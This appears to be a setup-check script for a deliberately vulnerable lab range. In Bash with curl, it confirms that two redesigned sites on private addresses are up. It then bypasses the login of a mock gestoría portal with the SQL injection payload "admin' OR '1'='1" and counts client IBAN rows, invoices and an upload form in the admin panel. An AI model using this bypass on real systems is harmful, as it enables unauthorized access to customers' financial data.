#!/bin/bash
T=172.20.17.230
echo "== JAMSEC web (nuevo diseño) =="; curl -s -m6 http://172.20.17.240/ | grep -c "Pensamos como el"
echo "== Apex index (nuevo diseño) =="; curl -s -m6 http://$T/ | grep -c "gestoria de"
echo -n "== Apex login HTTP: "; curl -s -o /dev/null -w "%{http_code}\n" -m6 http://$T/login.php

rm -f /tmp/cj
echo -n "== SQLi login (cookie) -> "; curl -s -c /tmp/cj -o /dev/null -w "HTTP %{http_code}  %{redirect_url}\n" -m6 \
  --data-urlencode "usuario=admin' OR '1'='1" --data-urlencode "password=x" http://$T/login.php
echo -n "== panel resum HTTP: "; curl -s -b /tmp/cj -o /dev/null -w "%{http_code}\n" -m6 "http://$T/panel.php?seccion=resum"
echo -n "== panel clients (filas IBAN ES): "; curl -s -b /tmp/cj -m6 "http://$T/panel.php?seccion=clients" | grep -c "ES"
echo -n "== panel factures (filas F2026): "; curl -s -b /tmp/cj -m6 "http://$T/panel.php?seccion=factures" | grep -c "F2026"
echo -n "== panel documents tiene form upload: "; curl -s -b /tmp/cj -m6 "http://$T/panel.php?seccion=documents" | grep -c "archivo"
